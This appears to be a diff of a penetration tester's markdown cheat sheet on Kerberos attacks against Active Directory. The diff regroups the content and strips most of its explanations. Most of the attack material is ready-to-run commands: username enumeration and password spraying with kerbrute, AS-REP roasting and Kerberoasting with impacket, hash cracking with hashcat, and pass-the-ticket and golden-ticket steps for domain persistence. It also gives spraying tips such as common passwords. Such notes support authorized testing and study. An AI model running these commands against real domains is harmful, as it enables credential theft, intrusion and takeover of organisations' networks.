@@ -1,30 +1,19 @@
-# Kerberos Enumeration (88)
-
-## Run nmap Kerberos scripts
+# Enumeration
+## nmap Kerberos scripts
 ```bash
 nmap -p 88 --script=krb5-enum-users,krb5-realm $IP
-```
-
-## Check Kerberos service with UDP and TCP
-```bash
-nmap -sU -sS -p 88 $IP
-```
-
-## Enumerate domain users with netexec
-```bash
-netexec smb $IP -u '' -p '' --users
-```
-
-## Enumerate users with rpcclient
-```bash
-rpcclient -U "" -N $IP -c enumdomusers
 ```
 
 ## Enumerate usernames with kerbrute
 ```bash
 kerbrute userenum -d domain.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
 ```
+## Password spray with kerbrute
+```bash
+kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
+```
 
+# AS-REP Roasting
 ## Check for ASREPRoastable users with impacket
 ```bash
 impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
@@ -45,6 +34,7 @@ netexec ldap $IP -u users.txt -p '' --asreproast asrep_hashes.txt
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
+# Kerberoasting
 ## Request Kerberoast TGS tickets with impacket
 ```bash
 impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
@@ -60,16 +50,7 @@ netexec ldap $IP -u username -p password --kerberoasting kerberoast_hashes.txt
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Password spray with netexec
-```bash
-netexec smb $IP -u users.txt -p 'Password123!' --continue-on-success
-```
-
-## Password spray with kerbrute
-```bash
-kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
-```
-
+# Golden Ticket
 ## Request TGT with NTLM hash
 ```bash
 impacket-getTGT domain.local/username -hashes :ntlm_hash
@@ -99,31 +80,16 @@ impacket-psexec domain.local/username@target.domain.local -k -no-pass
 6. Crack obtained hashes offline
 
 ## ASREPRoasting Attack
-
-**What is ASREPRoasting:**
-Targets user accounts with "Do not require Kerberos preauthentication" enabled. This misconfiguration allows attackers to request authentication data for these users without a password, which can then be cracked offline.
-
-**Attack workflow:**
 1. Enumerate users (kerbrute, netexec, or rpcclient)
-2. Test users for ASREPRoastable accounts (GetNPUsers)
+2. Test users for accounts with "Do not require Kerberos preauthentication" enabled  (GetNPUsers)
 3. Collect AS-REP hashes
 4. Crack hashes
 
-**No credentials needed:** ASREPRoasting works without any domain credentials.
-
 ## Kerberoasting Attack
-
-**What is Kerberoasting:**
-Targets service accounts with Service Principal Names (SPNs). Authenticated users can request TGS tickets for services, which are encrypted with the service account's password hash. These tickets can be cracked offline.
-
-**Attack workflow:**
 1. Obtain valid domain credentials (any user)
 2. Query for accounts with SPNs (GetUserSPNs)
 3. Request TGS tickets for those services
 4. Crack tickets offline to recover service account passwords
-
-**Requires credentials:** Unlike ASREPRoasting, Kerberoasting needs valid domain user credentials.
-
 ## Username Enumeration
 
 **kerbrute:** Fast, uses Kerberos pre-authentication to validate usernames without triggering account lockouts.
@@ -142,22 +108,6 @@ Targets service accounts with Service Principal Names (SPNs). Authenticated user
 - Use one password against many users (not many passwords against one user)
 - Common passwords: Password123!, Welcome123!, Summer2024!, CompanyName2024!
 - Monitor for account lockouts
-- Space out attempts to avoid detection
-
-**Tools:**
-- kerbrute: Fast and less likely to trigger lockouts
-- netexec: Supports continue-on-success for comprehensive testing
-
-## Hash Cracking
-
-**ASREPRoast hashes (mode 18200):**
-Format: krb5asrep
-Faster to crack than Kerberoast hashes
-
-**Kerberoast hashes (mode 13100):**
-Format: krb5tgs
-May take longer depending on password complexity
-
 ## Pass-the-Ticket Attacks
 
 Once you have a valid TGT (Ticket Granting Ticket):
@@ -179,33 +129,6 @@ If krbtgt hash is obtained (requires Domain Admin):
 2. Grant yourself any privileges
 3. Access any resource in the domain
 4. Persistence mechanism (tickets valid until krbtgt password changed)
-
-## Common Kerberos Misconfigurations
-
-1. **Users with "Do not require Kerberos preauthentication"**
-2. **Service accounts with weak passwords**
-3. **Service accounts with Domain Admin privileges**
-4. **Unconstrained delegation on computers**
-5. **Constrained delegation misconfigurations**
-6. **RC4 encryption enabled (weak)**
-
-## Attack Checklist Priority
-
-1. Username enumeration (kerbrute)
-2. ASREPRoasting (no creds needed)
-3. Password spraying (common passwords)
-4. Kerberoasting (if creds obtained)
-5. Hash cracking
-6. Ticket-based attacks (PTH, PTT)
-
-## Next Steps
-
-Once Kerberos attacks succeed:
-1. Use cracked credentials for lateral movement
-2. Check for delegation opportunities
-3. Extract additional tickets from compromised systems
-4. Escalate to Domain Admin if possible
-5. Enumerate trusts for cross-domain attacks
 
 ---
 
